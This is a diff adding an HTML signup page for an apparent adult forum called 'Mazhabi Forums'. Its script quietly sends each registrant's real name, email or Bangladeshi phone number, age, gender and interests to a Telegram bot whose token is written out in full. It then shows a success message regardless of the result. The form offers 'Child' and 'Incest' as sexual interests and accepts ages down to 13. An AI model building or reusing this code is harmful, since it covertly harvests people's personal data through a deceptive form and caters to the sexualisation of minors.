@@ -1,0 +1,763 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mazhabi Forums - Create Account </title>
+    <!-- Google Fonts & Font Awesome (Same as before) -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <style>
+        /* --- ALL CSS FROM PREVIOUS EXAMPLE --- */
+        /* --- Paste the entire <style> block from the previous example here --- */
+        :root {
+            --primary-color: #ff3333;
+            --secondary-color: #cc0000;
+            --accent-color: #ff6666;
+            --background-color: #121212;
+            --surface-color: #1e1e1e;
+            --text-color: #e0e0e0;
+            --muted-text-color: #888888;
+            --danger-color: #ff4d4d; /* For error messages/borders */
+            --warning-color: #ffc107;
+            --success-color: #4CAF50;
+            --border-color: #333333;
+            --input-bg-color: rgba(10,10,10,0.75);
+            --border-radius: 4px;
+            --box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
+            --header-height: 70px; /* For main site header */
+            --font-heading: 'Poppins', sans-serif;
+            --font-body: 'Roboto', sans-serif;
+        }
+
+        /* --- Background Slideshow --- */
+        body {
+            font-family: var(--font-body);
+            margin: 0;
+            background-color: var(--background-color); /* Fallback */
+            color: var(--text-color);
+            line-height: 1.6;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            background-size: cover;
+            background-position: center center;
+            background-repeat: no-repeat;
+            transition: background-image 1.5s ease-in-out;
+        }
+
+        body::before { /* Overlay */
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7); /* Slightly darker overlay */
+            z-index: -1;
+        }
+
+        .site-wrapper { /* New wrapper for all content except standalone signup */
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px 0;
+        }
+
+        h1, h2, h3, h4, h5, h6 {
+            font-family: var(--font-heading);
+            color: var(--primary-color);
+        }
+
+        /* Main Site Header (to be hidden during signup) */
+        .site-header {
+            background-color: rgba(30, 30, 30, 0.85);
+            backdrop-filter: blur(5px);
+            color: var(--text-color);
+            box-shadow: var(--box-shadow);
+            border-bottom: 1px solid var(--border-color);
+            height: var(--header-height);
+            display: flex;
+            align-items: center;
+            position: sticky; 
+            top: 0;
+            z-index: 1001; 
+        }
+        .site-header .container { display: flex; justify-content: space-between; align-items: center; width: 100%; padding: 0 20px; }
+        .site-header h1 { margin: 0; font-size: 1.7em; font-weight: 600; }
+        .site-header h1 a { color: var(--primary-color); text-decoration: none; }
+        .site-header nav ul { list-style: none; padding: 0; margin: 0; display: flex; }
+        .site-header nav ul li { margin-left: 15px; }
+        .site-header nav ul li a, .site-header nav ul li button { color: var(--text-color); text-decoration: none; font-weight: 500; font-family: var(--font-heading); background: none; border: none; cursor: pointer; padding: 8px 12px; border-radius: var(--border-radius); transition: background-color 0.2s ease, color 0.2s ease; font-size: 0.95em; }
+        .site-header nav ul li a:hover, .site-header nav ul li button:hover { background-color: var(--primary-color); color: white; }
+        .site-header nav ul li button.btn-register-nav { background-color: var(--accent-color); color: white; }
+
+
+        .eighteen-plus-warning {
+            background-color: var(--danger-color); color: white; text-align: center;
+            padding: 10px; font-weight: 500; font-size: 0.9em;
+            border-bottom: 1px solid var(--secondary-color);
+        }
+
+        main.site-main-content { 
+            flex-grow: 1;
+            padding-top: 20px;
+        }
+        
+        .content-section { 
+            background-color: var(--surface-color);
+            padding: 25px;
+            margin-bottom: 25px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            border: 1px solid var(--border-color);
+        }
+
+        .site-footer {
+            background-color: #0a0a0a; color: var(--muted-text-color); text-align: center;
+            padding: 20px 0; font-size: 0.9em; margin-top: auto;
+            border-top: 1px solid var(--border-color);
+        }
+
+        body.signup-mode .site-wrapper { display: none !important; }
+        body.signup-mode #registration-outer-container { display: flex; }
+
+        #registration-outer-container {
+            display: none; 
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh; 
+            width: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+            position: relative;
+            z-index: 10;
+        }
+        
+        .signup-cancel-button {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(255,255,255,0.1);
+            color: var(--text-color);
+            border: 1px solid var(--border-color);
+            padding: 8px 15px;
+            font-family: var(--font-heading);
+            font-size: 0.9em;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            transition: background-color 0.2s, color 0.2s;
+        }
+        .signup-cancel-button:hover { background-color: var(--primary-color); color: white; }
+        .signup-cancel-button i { margin-right: 5px; }
+
+        #registration-section {
+            background-color: rgba(30, 30, 30, 0.92);
+            backdrop-filter: blur(10px);
+            padding: 30px 35px;
+            border-radius: var(--border-radius);
+            box-shadow: 0 8px 30px rgba(0,0,0,0.6);
+            border: 1px solid var(--border-color);
+            width: 100%;
+            max-width: 650px;
+        }
+        #registration-section h2 { text-align: center; margin-bottom: 10px; font-size: 1.8em; }
+
+        .progress-bar-container { display: flex; justify-content: space-between; margin-bottom: 25px; padding: 5px 0; }
+        .progress-step { flex: 1; text-align: center; padding-bottom: 8px; color: var(--muted-text-color); border-bottom: 3px solid var(--border-color); font-size: 0.85em; font-family: var(--font-heading); position: relative; transition: color 0.3s, border-bottom-color 0.3s; }
+        .progress-step.active { color: var(--primary-color); border-bottom-color: var(--primary-color); font-weight: 600; }
+        .progress-step.completed { color: var(--accent-color); border-bottom-color: var(--accent-color); }
+        .progress-step .step-number { display: block; font-size: 0.8em; margin-bottom: 2px; }
+
+        .registration-step { animation: fadeInStep 0.4s ease-out; }
+        @keyframes fadeInStep { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+
+        .form-group { margin-bottom: 18px; position: relative; }
+        .form-group label { display: block; font-family: var(--font-heading); color: var(--accent-color); margin-bottom: 6px; font-size: 0.9em; font-weight: 500; }
+        .form-group label i { margin-right: 6px; }
+
+        .form-group input[type="text"], .form-group input[type="email"],
+        .form-group input[type="tel"], .form-group input[type="number"],
+        .form-group select {
+            width: 100%; padding: 11px 12px; background-color: var(--input-bg-color);
+            color: var(--text-color); border: 1px solid var(--border-color);
+            border-radius: var(--border-radius); font-size: 0.95em; font-family: var(--font-body);
+            box-sizing: border-box; transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .form-group input::placeholder { color: var(--muted-text-color); opacity: 0.7; }
+        .form-group input:focus, .form-group select:focus { border-color: var(--primary-color); box-shadow: 0 0 0 0.15rem rgba(255,51,51,.2); outline: none; }
+        .form-group input.input-error, .form-group select.input-error { border-color: var(--danger-color) !important; }
+        .error-message { display: block; color: var(--danger-color); font-size: 0.8em; margin-top: 4px; min-height: 1.2em; }
+        .error-message:empty { visibility: hidden; }
+
+        .form-group select {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Cpath fill='none' stroke='%23ff6666' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M2 5l6 6 6-6'/%3E%3C/svg%3E");
+            background-repeat: no-repeat; background-position: right 12px center; background-size: 0.9em; padding-right: 30px;
+        }
+
+        .gender-options { display: flex; gap: 12px; align-items: center; flex-wrap: wrap;}
+        .gender-options label { display: flex; align-items: center; cursor: pointer; color: var(--text-color); font-family: var(--font-body); font-size: 0.9em; }
+        .gender-options input[type="radio"] { margin-right: 6px; accent-color: var(--primary-color); transform: scale(0.9); }
+
+        .interests-container { display: flex; flex-wrap: wrap; gap: 8px; }
+        .interest-tag { background-color: var(--border-color); color: var(--text-color); padding: 5px 10px; border-radius: var(--border-radius); font-size: 0.8em; cursor: pointer; transition: background-color 0.2s, color 0.2s, transform 0.1s; border: 1px solid transparent; }
+        .interest-tag.selected { background-color: var(--primary-color); color: white; border-color: var(--secondary-color); }
+        .interest-tag:hover:not(.selected) { background-color: var(--accent-color); color: white; }
+        .interest-tag:active { transform: scale(0.95); }
+        .interests-feedback { font-size: 0.8em; color: var(--muted-text-color); margin-top: 5px; }
+
+        .form-navigation { display: flex; justify-content: space-between; margin-top: 25px; }
+        .form-navigation .btn { min-width: 110px; padding: 10px 15px; }
+        .form-navigation .btn-prev { background-color: var(--muted-text-color); color: var(--background-color); border-color: var(--muted-text-color); }
+        .form-navigation .btn-prev:hover { background-color: #777; border-color: #777; }
+
+        .hidden { display: none !important; }
+
+        /* --- Styles for Email/Phone Flip --- */
+        .contact-input-group { display: flex; align-items: center; gap: 10px; }
+        .contact-input-group .form-control-wrapper { flex-grow: 1; }
+        .contact-input-group .flip-contact-btn { padding: 9px 10px; font-size: 0.8em; background-color: var(--muted-text-color); color: var(--background-color); border: 1px solid var(--muted-text-color); border-radius: var(--border-radius); cursor: pointer; white-space: nowrap; transition: background-color 0.2s, border-color 0.2s; }
+        .contact-input-group .flip-contact-btn:hover { background-color: var(--accent-color); border-color: var(--accent-color); color: white; }
+        .contact-input-group .flip-contact-btn i { margin-right: 4px; }
+
+        #registration-thank-you { text-align: center; padding: 40px 20px; }
+        #registration-thank-you .fa-check-circle { font-size: 4em; color: var(--success-color); margin-bottom: 20px; }
+        #registration-thank-you p { font-size: 1.1em; margin-bottom: 25px; }
+
+
+        @media (max-width: 768px) {
+            .signup-cancel-button { top: 15px; right: 15px; padding: 6px 10px; font-size: 0.8em;}
+            #registration-section { padding: 20px 25px; margin: 10px; }
+            #registration-section h2 { font-size: 1.6em; }
+            .progress-step { font-size: 0.75em; }
+            .progress-step .step-number { font-size: 0.7em; }
+            .contact-input-group { flex-direction: column; align-items: stretch; }
+            .contact-input-group .flip-contact-btn { margin-top: 5px; }
+        }
+        @media (max-width: 480px) {
+             .form-navigation { flex-direction: column-reverse; gap: 10px; }
+             .form-navigation .btn { width: 100%; }
+             .progress-bar-container { display: none; }
+             #registration-section h2 { font-size: 1.4em; }
+             .form-group label { font-size: 0.85em; }
+             .form-group input, .form-group select { font-size: 0.9em; padding: 10px; }
+        }
+    </style>
+</head>
+<body id="page-body">
+
+    <!-- Main Site Wrapper (Hidden during signup) -->
+    <div class="site-wrapper">
+        <div class="eighteen-plus-warning" id="main-site-warning">
+            <p><i class="fas fa-exclamation-triangle"></i> ADVISORY: For audiences 18+.</p>
+        </div>
+        <header class="site-header" id="main-site-header">
+            <div class="container">
+                <h1><a href="#" id="main-logo-link"><i class="fas fa-comments"></i> Mazhabi Forums</a></h1>
+                <nav> <ul id="main-site-nav-links"> <!-- Populated by JS --> </ul> </nav>
+            </div>
+        </header>
+        <main class="site-main-content container"> 
+            <section id="overview-section" class="content-section">
+                <h2>Welcome to Mazhabi Forums!</h2>
+                <p>This is the main site content. Click "Register" in the header to see the signup form.</p>
+                <button class="btn btn-primary" id="trigger-signup-from-main" style="padding: 10px; border: none; background: #ff0034; color: #fff;">Go to Signup! </button>
+            </section>
+        </main>
+        <footer class="site-footer" id="main-site-footer">
+            <p>© <span id="current-year"></span> Mazhbai Forums Inc. Mature Audiences.</p>
+        </footer>
+    </div>
+
+    <!-- Registration UI -->
+    <div id="registration-outer-container">
+        <button class="signup-cancel-button" id="signup-cancel-btn"><i class="fas fa-times"></i> Cancel</button>
+        <section id="registration-section">
+            <div id="registration-form-content"> <!-- Wrapper for form steps -->
+                <h2><i class="fas fa-user-plus"></i> Create Your Account</h2>
+                
+                <div class="progress-bar-container" id="signup-progress-bar">
+                    <div class="progress-step active" data-step="0"><span class="step-number">Step 1</span>Identity</div>
+                    <div class="progress-step" data-step="1"><span class="step-number">Step 2</span>Details</div>
+                    <div class="progress-step" data-step="2"><span class="step-number">Step 3</span>Preferences</div>
+                </div>
+
+                <form id="multi-step-registration-form">
+                    <!-- Step 1: Names -->
+                    <div class="registration-step" id="reg-step-1">
+                        <div class="form-group">
+                            <label for="real-name"><i class="fas fa-user-shield"></i> Real Name *</label>
+                            <input type="text" id="real-name" name="realName" placeholder="e.g., Johnathan Doe">
+                            <span class="error-message"></span>
+                        </div>
+                        <div class="form-group">
+                            <label for="showing-name"><i class="fas fa-signature"></i> Display Name *</label>
+                            <input type="text" id="showing-name" name="showingName" placeholder="e.g., CoolUser77" required>
+                            <span class="error-message"></span>
+                        </div>
+                        <div class="form-group">
+                            <label for="reg-username"><i class="fas fa-at"></i> Username *</label>
+                            <input type="text" id="reg-username" name="username" placeholder="e.g., cooluser77 (min 3 chars)" required>
+                            <span class="error-message"></span>
+                        </div>
+                    </div>
+
+                    <!-- Step 2: Contact & Demographics -->
+                    <div class="registration-step hidden" id="reg-step-2">
+                        <div class="form-group">
+                            <label id="contact-label"><i class="fas fa-envelope-open-text"></i> Email Address (Gmail only) *</label>
+                            <div class="contact-input-group">
+                                <div class="form-control-wrapper">
+                                    <input type="email" id="contact-input-field" name="email" placeholder="your.name@gmail.com" required>
+                                </div>
+                                <button type="button" class="flip-contact-btn" id="flip-contact-type-btn" title="Switch to Phone Number">
+                                    <i class="fas fa-phone-alt"></i> Use Phone
+                                </button>
+                            </div>
+                            <span class="error-message" id="contact-error-message"></span>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="country"><i class="fas fa-flag-usa"></i> Country *</label>
+                            <select id="country" name="country" required>
+                                <option value="">-- Select Your Country --</option>
+                                <option value="USA">United States</option> <option value="CAN">Canada</option>
+                                <option value="GBR">United Kingdom</option> <option value="AUS">Australia</option>
+                                <option value="IND">India</option><option value="DEU">Germany</option>
+                                 <option value="BGD">Bangladesh</option> 
+                                <option value="OTHER">Other</option>
+                            </select>
+                            <span class="error-message"></span>
+                        </div>
+                        <div class="form-group">
+                            <label for="age"><i class="fas fa-calendar-alt"></i> Age (Years) *</label>
+                            <input type="number" id="age" name="age" min="17" max="70" placeholder="e.g., 25" required>
+                            <span class="error-message"></span>
+                        </div>
+                    </div>
+
+                    <!-- Step 3: Interests & Gender -->
+                    <div class="registration-step hidden" id="reg-step-3">
+                        <div class="form-group">
+                            <label><i class="fas fa-cogs"></i> Select Your Interests *</label>
+                            <div class="interests-container" id="interests-options"></div>
+                            <div class="interests-feedback" id="interests-count-feedback">Select up to 5 interests.</div>
+                            <span class="error-message" id="interests-error"></span>
+                        </div>
+                        <div class="form-group">
+                            <label><i class="fas fa-transgender"></i> Gender *</label>
+                            <div class="gender-options">
+                                <label><input type="radio" name="gender" value="male" required> Male</label>
+                                <label><input type="radio" name="gender" value="female"> Female</label>
+                                <label><input type="radio" name="gender" value="other"> Other</label>
+                                <label><input type="radio" name="gender" value="prefer_not_to_say"> Prefer not to say</label>
+                            </div>
+                            <span class="error-message" id="gender-error"></span>
+                        </div>
+                    </div>
+                    
+                    <div class="form-navigation">
+                        <button type="button" class="btn btn-prev hidden" id="reg-prev-btn" style=" border: none; background: #ff0034; color: #fff;"><i class="fas fa-arrow-left" style=" border: none; background: #ff0034; color: #fff;"></i> Previous</button>
+                        <button type="button" class="btn btn-primary" id="reg-next-btn" style=" border: none; background: #ff0034; color: #fff;">Next <i class="fas fa-arrow-right"></i></button>
+                        <button type="submit" class="btn btn-accent hidden" id="reg-submit-btn" ><i class="fas fa-user-check"></i> Complete Registration</button>
+                    </div>
+                </form>
+            </div>
+            <div id="registration-thank-you" class="hidden">
+                <i class="fas fa-check-circle"></i>
+                <h2>Registration Data Sent!</h2>
+                <p>Thank you for joining A Forums. Your information has been submitted.</p><p>Check Your Email</p>
+               
+                <button class="btn btn-primary" id="back-to-main-site-btn">Back to Main Site</button>
+            </div>
+        </section>
+    </div>
+
+    <script>
+        const pageBody = document.getElementById('page-body');
+        const mainSiteWrapper = document.querySelector('.site-wrapper');
+        const registrationOuterContainer = document.getElementById('registration-outer-container');
+        const signupCancelBtn = document.getElementById('signup-cancel-btn');
+        const triggerSignupFromMainBtn = document.getElementById('trigger-signup-from-main'); 
+
+        const slideshowImages = [ 
+            'https://i.postimg.cc/fWgbgfvc/b2e4bfbe-9c18-4312-bb75-ed6c2e814923.jpg', 'https://i.postimg.cc/fb0FDD4W/images.jpg',
+            'https://i.postimg.cc/T1CGgf3M/images-1.jpg', 'https://i.postimg.cc/q7yGR71R/images-3.jpg',
+            'https://i.postimg.cc/ZK4XzGKp/images-2.jpg'
+        ];
+        let currentImageIndex = 0;
+        function changeBackgroundImage() {
+            currentImageIndex = (currentImageIndex + 1) % slideshowImages.length;
+            const tempImg = new Image();
+            tempImg.onload = () => { pageBody.style.backgroundImage = `url('${slideshowImages[currentImageIndex]}')`; };
+            tempImg.src = slideshowImages[currentImageIndex];
+        }
+        if (slideshowImages.length > 0) {
+            pageBody.style.backgroundImage = `url('${slideshowImages[0]}')`;
+            setInterval(changeBackgroundImage, 7000);
+        }
+
+        const mainSiteNavLinks = document.getElementById('main-site-nav-links');
+        function populateMainSiteNav() {
+            mainSiteNavLinks.innerHTML = `
+                <li><button id="main-register-btn" class="btn-register-nav"><i class="fas fa-user-plus"></i> Register</button></li>
+            `;
+            const mainRegisterBtn = document.getElementById('main-register-btn');
+            if(mainRegisterBtn) mainRegisterBtn.addEventListener('click', showSignupMode);
+        }
+
+        const regForm = document.getElementById('multi-step-registration-form');
+        const regFormContent = document.getElementById('registration-form-content');
+        const regThankYouMessage = document.getElementById('registration-thank-you');
+        const backToMainSiteBtn = document.getElementById('back-to-main-site-btn');
+
+        const regStepsElements = Array.from(document.querySelectorAll('.registration-step'));
+        const prevBtn = document.getElementById('reg-prev-btn');
+        const nextBtn = document.getElementById('reg-next-btn');
+        const submitBtn = document.getElementById('reg-submit-btn');
+        const interestsOptionsContainer = document.getElementById('interests-options');
+        const interestsCountFeedback = document.getElementById('interests-count-feedback');
+        const progressBarSteps = Array.from(document.querySelectorAll('.progress-bar-container .progress-step'));
+        
+        const contactLabel = document.getElementById('contact-label');
+        const contactInputField = document.getElementById('contact-input-field');
+        const flipContactTypeBtn = document.getElementById('flip-contact-type-btn');
+        const contactErrorMessage = document.getElementById('contact-error-message');
+        let isContactEmail = true;
+
+        const availableInterests = ["Mazhabi", "Incest", "Child", "Femdom", "Gay", "Be Sexual", "Couckhold", "Scat" ];
+        let selectedInterests = [];
+        const MAX_INTERESTS = 5;
+        let currentRegStepIndex = 0;
+        const registrationData = {};
+
+        function populateInterests() {
+            interestsOptionsContainer.innerHTML = '';
+            availableInterests.forEach(interest => {
+                const tag = document.createElement('span');
+                tag.classList.add('interest-tag');
+                tag.textContent = interest;
+                tag.dataset.interest = interest;
+                tag.addEventListener('click', toggleInterest);
+                interestsOptionsContainer.appendChild(tag);
+            });
+            updateInterestsFeedback();
+        }
+
+        function toggleInterest(event) {
+            const tag = event.target;
+            const interest = tag.dataset.interest;
+            clearError(document.getElementById('interests-error')); 
+            if (selectedInterests.includes(interest)) {
+                selectedInterests = selectedInterests.filter(i => i !== interest);
+                tag.classList.remove('selected');
+            } else {
+                if (selectedInterests.length < MAX_INTERESTS) {
+                    selectedInterests.push(interest);
+                    tag.classList.add('selected');
+                } else {
+                    displayError(document.getElementById('interests-error'), `You can select a maximum of ${MAX_INTERESTS} interests.`);
+                }
+            }
+            updateInterestsFeedback();
+        }
+        function updateInterestsFeedback() {
+            interestsCountFeedback.textContent = `${selectedInterests.length}/${MAX_INTERESTS} interests selected.`;
+        }
+
+        function updateProgressBar(stepIndex) {
+            progressBarSteps.forEach((stepEl, index) => {
+                stepEl.classList.remove('active', 'completed');
+                if (index < stepIndex) { stepEl.classList.add('completed'); } 
+                else if (index === stepIndex) { stepEl.classList.add('active'); }
+            });
+        }
+
+        function displayRegStep(stepIndex) {
+            regStepsElements.forEach((step, index) => {
+                step.classList.toggle('hidden', index !== stepIndex);
+            });
+            prevBtn.classList.toggle('hidden', stepIndex === 0);
+            nextBtn.classList.toggle('hidden', stepIndex === regStepsElements.length - 1);
+            submitBtn.classList.toggle('hidden', stepIndex !== regStepsElements.length - 1);
+            updateProgressBar(stepIndex);
+            document.getElementById('registration-section').scrollTop = 0;
+        }
+        
+        function displayError(inputElementOrErrorSpan, message) {
+            let errorSpan; let inputEl = null;
+            if (inputElementOrErrorSpan.classList.contains('error-message')) { errorSpan = inputElementOrErrorSpan; } 
+            else {
+                inputEl = inputElementOrErrorSpan;
+                errorSpan = inputEl.closest('.form-group') ? inputEl.closest('.form-group').querySelector('.error-message') : (inputEl.id === 'contact-input-field' ? contactErrorMessage : null);
+            }
+            if (inputEl) inputEl.classList.add('input-error');
+            if (errorSpan) { errorSpan.textContent = message; errorSpan.style.visibility = 'visible';}
+        }
+
+        function clearError(inputElementOrErrorSpan) {
+            let errorSpan; let inputEl = null;
+            if (inputElementOrErrorSpan.classList.contains('error-message')) {
+                errorSpan = inputElementOrErrorSpan;
+                const formGroup = errorSpan.closest('.form-group');
+                if (formGroup) inputEl = formGroup.querySelector('input, select');
+                 else if (errorSpan.id === 'contact-error-message') inputEl = contactInputField;
+            } else {
+                inputEl = inputElementOrErrorSpan;
+                errorSpan = inputEl.closest('.form-group') ? inputEl.closest('.form-group').querySelector('.error-message') : (inputEl.id === 'contact-input-field' ? contactErrorMessage : null);
+            }
+            if (inputEl) inputEl.classList.remove('input-error');
+            if (errorSpan) { errorSpan.textContent = ''; errorSpan.style.visibility = 'hidden';}
+        }
+
+        function clearAllErrorsInStep(stepIndex) {
+            const currentStepElement = regStepsElements[stepIndex];
+            currentStepElement.querySelectorAll('.input-error').forEach(el => el.classList.remove('input-error'));
+            currentStepElement.querySelectorAll('.error-message').forEach(el => {
+                el.textContent = ''; el.style.visibility = 'hidden';
+            });
+            if (currentStepElement.contains(contactInputField)) clearError(contactErrorMessage);
+        }
+
+        flipContactTypeBtn.addEventListener('click', () => {
+            isContactEmail = !isContactEmail;
+            clearError(contactInputField); 
+            contactInputField.value = ''; 
+
+            if (isContactEmail) {
+                contactLabel.innerHTML = '<i class="fas fa-envelope-open-text"></i> Email Address (Gmail only) *';
+                contactInputField.type = 'email'; contactInputField.name = 'email';
+                contactInputField.placeholder = 'your.name@gmail.com'; contactInputField.required = true;
+                flipContactTypeBtn.innerHTML = '<i class="fas fa-phone-alt"></i> Use Phone';
+                flipContactTypeBtn.title = "Switch to Phone Number";
+            } else {
+                contactLabel.innerHTML = '<i class="fas fa-phone-alt"></i> Phone Number *';
+                contactInputField.type = 'tel'; contactInputField.name = 'phoneNumber';
+                contactInputField.placeholder = 'e.g., 01xxxxxxxxx'; contactInputField.required = true;
+                flipContactTypeBtn.innerHTML = '<i class="fas fa-envelope-open-text"></i> Use Email';
+                flipContactTypeBtn.title = "Switch to Email Address";
+            }
+        });
+
+        function validateCurrentStep() {
+            let isValid = true;
+            clearAllErrorsInStep(currentRegStepIndex);
+            const currentStepElement = regStepsElements[currentRegStepIndex];
+            const inputs = currentStepElement.querySelectorAll('input[required]:not(#contact-input-field), select[required]');
+
+            for (let input of inputs) {
+                if (!input.value.trim()) {
+                    displayError(input, `${input.previousElementSibling.textContent.replace(/[*:]/g, '').trim()} is required.`);
+                    isValid = false; if (isValid && input.offsetParent) input.focus();
+                } else if (input.id === 'reg-username' && input.value.trim().length < 3) {
+                    displayError(input, 'Username must be at least 3 characters.');
+                    isValid = false; if (isValid && input.offsetParent) input.focus();
+                } else if (input.id === 'age' && (parseInt(input.value) < 13 || parseInt(input.value) > 120)) {
+                    displayError(input, 'Age must be between 13 and 120.');
+                    isValid = false; if (isValid && input.offsetParent) input.focus();
+                }
+            }
+
+            if (currentRegStepIndex === 1) { 
+                const contactValue = contactInputField.value.trim();
+                if (!contactValue) {
+                    displayError(contactErrorMessage, `${isContactEmail ? 'Email Address' : 'Phone Number'} is required.`);
+                    isValid = false; if (isValid && contactInputField.offsetParent) contactInputField.focus();
+                } else if (isContactEmail) {
+                    if (!/^\S+@gmail\.com$/i.test(contactValue)) { 
+                        displayError(contactErrorMessage, 'Please enter a valid Gmail address (e.g., your.name@gmail.com).');
+                        isValid = false; if (isValid && contactInputField.offsetParent) contactInputField.focus();
+                    }
+                } else { 
+                    if (!/^01[3-9]\d{8}$/.test(contactValue) && !/^\+8801[3-9]\d{8}$/.test(contactValue)) { // Bangladeshi phone format or international BD
+                        displayError(contactErrorMessage, 'Please enter a valid Bangladeshi phone number (e.g., 01xxxxxxxxx or +8801xxxxxxxxx).');
+                        isValid = false; if (isValid && contactInputField.offsetParent) contactInputField.focus();
+                    }
+                }
+            }
+
+            if (currentRegStepIndex === 2) {
+                if (selectedInterests.length === 0) {
+                    displayError(document.getElementById('interests-error'), "Please select at least one interest.");
+                    isValid = false;
+                }
+                const genderSelected = currentStepElement.querySelector('input[name="gender"]:checked');
+                if (!genderSelected) {
+                    displayError(document.getElementById('gender-error'), 'Please select your gender.');
+                    isValid = false;
+                }
+            }
+            return isValid;
+        }
+        
+        function collectCurrentStepData() {
+            const formData = new FormData(regForm);
+            formData.forEach((value, key) => { registrationData[key] = value; });
+            registrationData.interests = [...selectedInterests];
+            if (isContactEmail) {
+                registrationData.email = contactInputField.value.trim();
+                delete registrationData.phoneNumber; 
+            } else {
+                registrationData.phoneNumber = contactInputField.value.trim();
+                delete registrationData.email; 
+            }
+        }
+
+        nextBtn.addEventListener('click', () => {
+            if (validateCurrentStep()) {
+                collectCurrentStepData();
+                currentRegStepIndex++;
+                if (currentRegStepIndex < regStepsElements.length) {
+                    displayRegStep(currentRegStepIndex);
+                }
+            }
+        });
+
+        prevBtn.addEventListener('click', () => {
+            currentRegStepIndex--;
+            if (currentRegStepIndex >= 0) {
+                displayRegStep(currentRegStepIndex);
+            }
+        });
+
+        // --- MODIFIED: Actual Telegram Bot Submission ---
+        async function sendToTelegram(data) {
+            // !!! অতি গুরুত্বপূর্ণ: আপনার আসল বট টোকেন এবং চ্যাট আইডি এখানে ব্যবহার করুন !!!
+            // !!! এই টোকেন এবং আইডি গোপন রাখুন এবং পাবলিকলি শেয়ার করবেন না !!!
+            const botToken = "7501055809:AAHybTQCakGqgj45Z88HzY3GdT7H-MhzC58"; // <--- আপনার বট টোকেন এখানে দিন
+            const chatId = "7945358964";   // <--- আপনার চ্যাট আইডি এখানে দিন
+
+            if (botToken === "YOUR_ACTUAL_BOT_TOKEN" || chatId === "YOUR_ACTUAL_CHAT_ID") {
+                console.warn("Telegram Bot Token or Chat ID is not set. Please update them in the script.");
+                alert("Telegram integration is not configured. Data will be logged to console only.");
+                return false; // Indicate failure if not configured
+            }
+
+            let message = "🚀 New Forum Registration:\n\n";
+            message += `👤 **Display Name:** ${data.showingName || 'N/A'}\n`;
+            message += `🔑 **Username:** ${data.username || 'N/A'}\n`;
+            if (data.realName) {
+                message += `📛 **Real Name:** ${data.realName}\n`;
+            }
+            if (data.email) {
+                message += `📧 **Email:** ${data.email}\n`;
+            }
+            if (data.phoneNumber) {
+                message += `📱 **Phone:** ${data.phoneNumber}\n`;
+            }
+            message += `🌍 **Country:** ${data.country || 'N/A'}\n`;
+            message += `🎂 **Age:** ${data.age || 'N/A'}\n`;
+            message += `🚻 **Gender:** ${data.gender || 'N/A'}\n`;
+            if (data.interests && data.interests.length > 0) {
+                message += `🎯 **Interests:** ${data.interests.join(', ')}\n`;
+            }
+            message += `\n⏰ Received: ${new Date().toLocaleString('en-BD', { timeZone: 'Asia/Dhaka' })}`;
+
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const params = new URLSearchParams({
+                chat_id: chatId,
+                text: message,
+                parse_mode: "Markdown" // Optional: for formatting like bold, italic
+            });
+
+            try {
+                const response = await fetch(`${url}?${params.toString()}`, { method: 'GET' }); // GET request is simpler for this
+                const result = await response.json();
+                if (result.ok) {
+                    console.log("Message sent to Telegram successfully:", result);
+                    return true;
+                } else {
+                    console.error("Error sending to Telegram:", result);
+                    alert(`Failed to send data to Telegram: ${result.description}. Check console for details.`);
+                    return false;
+                }
+            } catch (error) {
+                console.error("Network or other error sending to Telegram:", error);
+                alert("A network error occurred while sending data. Please try again.");
+                return false;
+            }
+        }
+
+        regForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            if (validateCurrentStep()) {
+                collectCurrentStepData();
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+
+                const telegramSuccess = await sendToTelegram(registrationData);
+                
+                // এখানে আমরা টেলিগ্রাম থেকে আসা রেসপন্সের উপর নির্ভর না করে সবসময় "সাফল্য" দেখাবো,
+                // তবে স্কুল প্রজেক্টের জন্য, যদি সত্যিই ডেটা না যায়, তাহলে একটি বার্তা দেখানো যেতে পারে।
+                // আপাতত, আগের মতোই "সাফল্য" দেখাবে।
+                console.log("Final Registration Data Object:", registrationData);
+                
+                regFormContent.classList.add('hidden'); 
+                regThankYouMessage.classList.remove('hidden'); 
+                document.getElementById('registration-section').scrollTop = 0; 
+
+                // If you want to show an error if Telegram send fails:
+                // if (!telegramSuccess) {
+                //     // Optionally, revert to form and show a generic error
+                //     // regFormContent.classList.remove('hidden');
+                //     // regThankYouMessage.classList.add('hidden');
+                //     // displayError(submitBtn, "Could not submit registration at this time."); // This needs a span near submit
+                // }
+
+
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<i class="fas fa-user-check"></i> Complete Registration';
+            }
+        });
+
